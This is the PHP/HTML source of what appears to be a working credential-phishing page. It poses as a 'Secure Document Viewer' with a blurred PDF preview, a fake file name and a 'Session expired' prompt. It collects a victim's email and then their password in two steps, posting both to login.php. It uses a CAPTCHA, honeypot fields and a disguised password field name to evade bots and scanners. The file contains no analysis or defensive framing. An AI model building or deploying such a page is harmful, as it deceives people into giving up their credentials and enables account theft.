<?php
session_start();

/**
 * Control step behavior:
 * - If coming freshly (no special flags) or on manual refresh → reset to step 1.
 * - If redirected from Step 1 success → allow Step 2.
 * - If redirected from Step 2 error → keep Step 2.
 */

// Flags set by login.php
$isFromStep1  = !empty($_SESSION['from_step1']);
$keepStep     = !empty($_SESSION['keep_step']);

// Clear one-shot flags
unset($_SESSION['from_step1'], $_SESSION['keep_step']);

// If NOT from step1 success and NOT from an explicit "keep step" redirect,
// treat this as a fresh load / refresh: reset wizard to step 1.
if (!$isFromStep1 && !$keepStep) {
    $_SESSION['step'] = 1;
    unset(
        $_SESSION['old_email'],
        $_SESSION['validated_email'],
        $_SESSION['verified_at'],
        $_SESSION['verified_ip'],
        $_SESSION['step2_token'],
        $_SESSION['step2_rendered_at']
    );
}

// Step control
$step = $_SESSION['step'] ?? 1;

// old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);

// If we're on step 2, record when the form was rendered (for min-time check)
if ($step == 2) {
    $_SESSION['step2_rendered_at'] = time();
}

// Step2 token is generated in login.php after step1 success
$step2_token = $_SESSION['step2_token'] ?? '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Document Viewer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Turnstile -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
    *, *::before, *::after { box-sizing: border-box; }

    :root {
        --card-bg: #fff;
        --text-color: #222;
        --subtext: #222;
        --border: #d4d4d4;
        --btn-bg: #1473e6;
        --btn-hover: #0f5cc0;
        --error: #c9252d;
        --overlay-dark: #000;
        --divider: #E4E4E7;
        --font-xs: 13px;
        --font-sm: 12px;
        --font-btn: 12px;
    }
    @media (prefers-color-scheme: dark) {
        :root {
            --card-bg: #f5f5f5;
            --text-color: #222;
            --subtext: #222;
            --border: #444;
            --btn-bg: #4a8fff;
            --btn-hover: #3a73d0;
            --divider: #e8e8e8;
        }
    }

    body {
        margin: 0;
        font-family: "Segoe UI", system-ui, sans-serif;
        background: #111;
        color: var(--text-color);
        min-height: 100vh;
    }

    .page-wrapper {
        position: relative;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    /* Background */
    .page-wrapper::before {
        content:"";
        position:absolute;
        inset:0;
        background:var(--overlay-dark);
    }

    .doc-background {
        position:absolute;
        inset:0;
        filter: blur(5px);
        opacity: .8;
        transform:scale(.98);
    }
    .doc-background img { width:100%; height:100%; object-fit:contain; }

    /* Card */
    .login-card {
        width:90%;
        max-width:310px;
        background:var(--card-bg);
        border-radius:4px;
        padding:18px 20px 22px;
        border:1px solid #d0d0d0;
        box-shadow:0 10px 24px rgba(0,0,0,.26);
        z-index:2;
        opacity:0;
        transform:translateY(14px) scale(.985);
        animation:fadeIn .45s ease-out forwards;
    }
    .login-card.has-error {
        border-color:rgba(201,37,45,.5);
    }
    @keyframes fadeIn {
        from {opacity:0; transform:translateY(20px) scale(.97);}
        to   {opacity:1; transform:translateY(0) scale(1);}
    }

    .top-divider {
        height:1px;
        background:var(--divider);
        margin:8px 0 12px;
    }

    .doc-icon { width:38px; margin:0 auto 6px; }
    .doc-icon img { width:100%; }

    .doc-title {
        text-align:center;
        font-size:14px;
        margin-bottom:2px;
        font-weight:600;
    }
    .doc-size { font-size:var(--font-xs); color:var(--subtext); }

    .doc-subtitle {
        text-align:center;
        color:var(--error);
        font-size:var(--font-xs);
        margin-bottom:6px;
        font-weight:600;
    }
    .login-error {
        text-align:center;
        color:var(--error);
        font-size:var(--font-xs);
        margin-bottom:8px;
        font-weight:600;
    }

    /* Fields */
    .field-wrapper {
        margin-bottom:9px;
        position:relative;
    }
    .field-wrapper input {
        width:100%;
        padding:8px 9px;
        font-size:var(--font-sm);
        border:1px solid var(--border);
        border-radius:3px;
        background:#fff;
        outline:none;
        color:#000;
    }
    @media (prefers-color-scheme: dark) {
        .field-wrapper input[name="name"] {
            color:#000 !important;
            background:#fff !important;
        }
    }

    .email-wrapper input { background:#fff !important; color:#000 !important; }

    /* Mail icon */
    .email-wrapper input {
        padding-left:28px;
    }
    .email-icon {
        position:absolute;
        left:9px;
        top:50%;
        transform:translateY(-50%);
        width:14px;
        height:14px;
        opacity:.7;
    }
    .email-icon path { fill:#777; }

    /* Padlock icon — on the LEFT */
    .lock-icon {
        position:absolute;
        left:9px;
        top:50%;
        transform:translateY(-50%);
        width:13px;
        height:13px;
        opacity:.7;
        pointer-events:none;
    }
    .lock-icon path { fill:#777; }

    .field-wrapper input[name="name"] {
        padding-left:28px;
    }

    /* Honeypot (hidden field) */
    .hp-wrapper {
        position:absolute;
        left:-9999px;
        width:1px;
        height:1px;
        overflow:hidden;
        opacity:0;
    }

    /* Turnstile */
    .captcha-wrapper {
        display:flex;
        justify-content:center;
        margin:6px 0 4px;
    }
    .cf-turnstile {
        transform:scale(.9);
        transform-origin:center;
    }

    /* Button */
    .btn-primary {
        width:100%;
        padding:9px 10px;
        background:var(--btn-bg);
        color:#fff;
        border:none;
        border-radius:3px;
        cursor:pointer;
        font-size:var(--font-btn);
        font-weight:600;
    }
    .btn-primary:hover { background:var(--btn-hover); }
</style>

</head>
<body>

<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/try.png" alt="Document preview">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" alt="PDF Icon">
        </div>

        <h2 class="doc-title">
            FA764783-2025.pdf <span class="doc-size"></span>
        </h2>

        <?php if ($step == 1 && !$error): ?>
            <p class="doc-subtitle">Session expired. Log in to access</p>
        <?php endif; ?>

        <div class="top-divider"></div>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
        <!-- STEP 1 -->
        <form method="POST" action="login.php">

            <div class="field-wrapper email-wrapper">
                <input
                    type="email"
                    name="email"
                    placeholder="Enter your email"
                    value="<?= htmlspecialchars($old_email) ?>"
                    required
                >
                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
                </svg>
            </div>

            <div class="captcha-wrapper">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
            </div>

            <!-- Honeypot for step 1 -->
            <div class="hp-wrapper">
                <input type="text" name="company" autocomplete="off">
            </div>

            <button class="btn-primary">Next</button>
        </form>

        <?php else: ?>
        <!-- STEP 2 -->
        <form method="POST" action="login.php">

            <div class="field-wrapper email-wrapper">
                <input
                    type="email"
                    name="email"
                    value="<?= htmlspecialchars($old_email) ?>"
                    required
                >
                <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
                    <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
                </svg>
            </div>

            <div class="field-wrapper">
                <input
                    type="password"
                    name="name"
                    placeholder="Password"
                    required
                >
                <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
                    <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
                </svg>
            </div>

            <!-- Step 2 security: token + honeypot -->
            <input type="hidden" name="step2_token" value="<?= htmlspecialchars($step2_token) ?>">

            <div class="hp-wrapper">
                <input type="text" name="company" autocomplete="off">
            </div>

            <button class="btn-primary">Next</button>
        </form>
        <?php endif; ?>
    </div>
</div>

</body>
</html>
